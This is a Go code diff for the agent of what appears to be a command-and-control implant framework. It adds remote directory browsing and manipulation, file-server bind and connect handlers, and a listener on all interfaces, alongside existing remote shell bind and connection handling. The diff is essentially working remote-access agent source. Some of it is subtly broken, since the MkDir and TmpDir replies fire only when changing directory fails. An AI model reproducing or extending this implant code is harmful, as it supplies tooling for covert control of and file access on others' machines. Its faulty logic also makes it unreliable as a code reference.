@@ -5,6 +5,7 @@ import (
 	"embed"
 	"encoding/gob"
 	"fmt"
+	"io/ioutil"
 	"os"
 	"os/signal"
 	"syscall"
@@ -20,7 +21,8 @@ func main() {
 	star.ParameterHandling()
 
 	// SECURITY RESEARCHER TODO: Configure default connections here
-	star.NewTCPListener(":42069")
+	star.NewTCPListener("0.0.0.0:42069") // Create a listener
+	//star.NewTCPConnection("www.example.com:80") // Connect to a listener
 
 	// Send a "hello" message to any existing connections
 	helloMsg := star.NewMessageHello()
@@ -85,8 +87,20 @@ func AgentProcessMessage(msg *star.Message) {
 		AgentProcessShellBindRequest(msg)
 	case star.MessageTypeShellConnection:
 		AgentProcessShellConnectionRequest(msg)
-	case star.MessageTypeFileServer:
-		AgentProcessFileServerRequest(msg)
+	case star.MessageTypeRemoteCDRequest:
+		AgentProcessRemoteCDRequest(msg)
+	case star.MessageTypeRemoteLSRequest:
+		AgentProcessRemoteLSRequest(msg)
+	case star.MessageTypeRemoteMkDirRequest:
+		AgentProcessRemoteMkDirRequest(msg)
+	case star.MessageTypeRemotePWDRequest:
+		AgentProcessRemotePWDRequest(msg)
+	case star.MessageTypeRemoteTmpDirRequest:
+		AgentProcessRemoteTmpDirRequest(msg)
+	case star.MessageTypeFileServerBind:
+		AgentProcessFileServerBind(msg)
+	case star.MessageTypeFileServerConnect:
+		AgentProcessFileServerConnect(msg)
 	}
 }
 
@@ -96,7 +110,7 @@ func AgentProcessBind(msg *star.Message) {
 	err := msg.GobDecodeMessage(&reqMsg)
 	if err == nil {
 		switch reqMsg.Type {
-		case star.ConnectorTypeTCP:
+		case star.ConnectorType_TCPTLS:
 			var address string
 			var b bytes.Buffer
 
@@ -119,7 +133,7 @@ func AgentProcessConnect(msg *star.Message) {
 	err := msg.GobDecodeMessage(&reqMsg)
 	if err == nil {
 		switch reqMsg.Type {
-		case star.ConnectorTypeTCP:
+		case star.ConnectorType_TCPTLS:
 			var address string
 			var b bytes.Buffer
 
@@ -175,7 +189,7 @@ func AgentProcessTerminateRequest(msg *star.Message) {
 			if !ok {
 				invalid = true
 			} else {
-				conn, ok := star.GetConnection(id)
+				conn, ok := star.GetConnectionById(id)
 				if !ok {
 					invalid = true
 				} else {
@@ -237,12 +251,109 @@ func AgentProcessShellConnectionRequest(msg *star.Message) {
 	}
 }
 
-func AgentProcessFileServerRequest(msg *star.Message) {
-	var reqMsg star.MessageFileServerRequest
+func AgentProcessRemoteCDRequest(msg *star.Message) {
+	var reqMsg star.MessageRemoteCDRequest
 
 	err := msg.GobDecodeMessage(&reqMsg)
 	if err == nil {
+		olddirectory, _ := os.Getwd()
+		os.Chdir(reqMsg.Directory)
+		newdirectory, _ := os.Getwd()
 
+		resMsg := star.NewMessageRemoteCDResponse(newdirectory, olddirectory, msg.Source)
+		resMsg.Send(star.ConnectID{})
+	}
+}
+
+func AgentProcessRemoteLSRequest(msg *star.Message) {
+	var reqMsg star.MessageRemoteLSRequest
+
+	err := msg.GobDecodeMessage(&reqMsg)
+	if err == nil {
+		files, _ := ioutil.ReadDir(reqMsg.Directory)
+
+		resMsg := star.NewMessageRemoteLSResponse(reqMsg.Directory, files)
+		resMsg.Destination = msg.Source
+		resMsg.Send(star.ConnectID{})
+	}
+}
+
+func AgentProcessRemoteMkDirRequest(msg *star.Message) {
+	var reqMsg star.MessageRemoteMkDirRequest
+
+	err := msg.GobDecodeMessage(&reqMsg)
+	if err == nil {
+		err = os.MkdirAll(reqMsg.Directory, 0700)
+		if err != nil {
+			errMsg := star.NewMessageError(star.MessageErrorResponseTypeDirectoryCreationError, err.Error())
+			errMsg.Destination = msg.Source
+			errMsg.Send(star.ConnectID{})
+
+			return
+		}
+
+		err = os.Chdir(reqMsg.Directory)
+		if err != nil {
+			directory, _ := os.Getwd()
+
+			resMsg := star.NewMessageRemoteMkDirResponse(directory)
+			resMsg.Send(star.ConnectID{})
+		}
+	}
+}
+
+func AgentProcessRemotePWDRequest(msg *star.Message) {
+	var reqMsg star.MessageRemotePWDRequest
+
+	err := msg.GobDecodeMessage(&reqMsg)
+	if err == nil {
+		directory, _ := os.Getwd()
+
+		resMsg := star.NewMessageRemotePWDResponse(directory)
+		resMsg.Destination = msg.Source
+		resMsg.Send(star.ConnectID{})
+	}
+}
+
+func AgentProcessRemoteTmpDirRequest(msg *star.Message) {
+	var reqMsg star.MessageRemoteTmpDirRequest
+
+	err := msg.GobDecodeMessage(&reqMsg)
+	if err == nil {
+		dir, err := os.MkdirTemp("", "")
+		if err != nil {
+			errMsg := star.NewMessageError(star.MessageErrorResponseTypeDirectoryCreationError, err.Error())
+			errMsg.Destination = msg.Source
+			errMsg.Send(star.ConnectID{})
+
+			return
+		}
+
+		err = os.Chdir(dir)
+		if err != nil {
+			directory, _ := os.Getwd()
+
+			resMsg := star.NewMessageRemoteTmpDirResponse(directory)
+			resMsg.Send(star.ConnectID{})
+		}
+	}
+}
+
+func AgentProcessFileServerBind(msg *star.Message) {
+	var reqMsg star.MessageFileServerBindRequest
+
+	err := msg.GobDecodeMessage(&reqMsg)
+	if err == nil {
+		star.NewFileServerListener(reqMsg.Address, reqMsg.Type, msg.Source, reqMsg.FileConnID)
+	}
+}
+
+func AgentProcessFileServerConnect(msg *star.Message) {
+	var reqMsg star.MessageFileServerConnectRequest
+
+	err := msg.GobDecodeMessage(&reqMsg)
+	if err == nil {
+		star.NewFileServerConnection(reqMsg.Address, reqMsg.Type, msg.Source, reqMsg.FileConnID)
 	}
 }
 
